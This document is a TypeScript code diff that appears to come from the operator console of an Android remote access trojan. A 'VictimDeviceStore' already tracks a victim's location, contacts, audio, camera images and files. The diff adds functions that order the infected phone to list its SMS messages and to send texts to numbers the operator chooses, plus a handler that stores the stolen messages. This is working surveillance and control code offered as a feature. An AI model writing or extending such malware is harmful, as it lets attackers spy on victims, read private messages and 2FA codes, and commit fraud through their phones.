@@ -18,6 +18,7 @@ import {
     type IServerToVictimEvents,
     type IVictim,
     type IVictimToServerEvents,
+    type SMSItem,
 } from '../../common/interfaces';
 import { bufferToDataUrl } from '../utils/Common';
 
@@ -47,6 +48,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
     public audioDataUrl: string | null = null;
     public location: [number, number] | null = null;
     public contacts: ContactItem[] = [];
+    public smsMessages: SMSItem[] = [];
 
     public constructor(input: IBaseEntity & IVictim) {
         this.id = input.id;
@@ -79,6 +81,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             files: observable,
             imageDataUrl: observable,
             location: observable,
+            smsMessages: observable,
             open: observable,
             setAudio: action,
             setCameras: action,
@@ -86,6 +89,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             setFiles: action,
             setImage: action,
             setLocation: action,
+            setSMSMessages: action,
             setOpen: action,
             setConnectionStatus: action,
         });
@@ -185,6 +189,16 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
             this.setContacts(data.contactsList);
         });
+
+        this.socket.on(VictimOrder.SMS, (data) => {
+            console.log(`[VICTIM] SMS from ${this.deviceId}`, data);
+
+            if (typeof data === 'boolean') {
+                // TODO: Show toast and progress
+            } else {
+                this.setSMSMessages(data.smsList);
+            }
+        });
     }
 
     public listCameras(): void {
@@ -236,6 +250,22 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
         });
     }
 
+    public sendSMS(phoneNo: string, msg: string): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.SMS,
+            extra: 'sendSMS',
+            to: phoneNo,
+            sms: msg,
+        });
+    }
+
+    public fetchSMSMessages(): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.SMS,
+            extra: 'ls',
+        });
+    }
+
     public setAudio(audio: Buffer | null): void {
         this.audioDataUrl =
             audio !== null ? bufferToDataUrl(audio, 'audio/mp3') : null;
@@ -267,6 +297,10 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
     public setLocation(location: [number, number] | null): void {
         this.location = location;
+    }
+
+    public setSMSMessages(smsMessages: SMSItem[]): void {
+        this.smsMessages = smsMessages;
     }
 
     public setOpen(open: boolean): void {
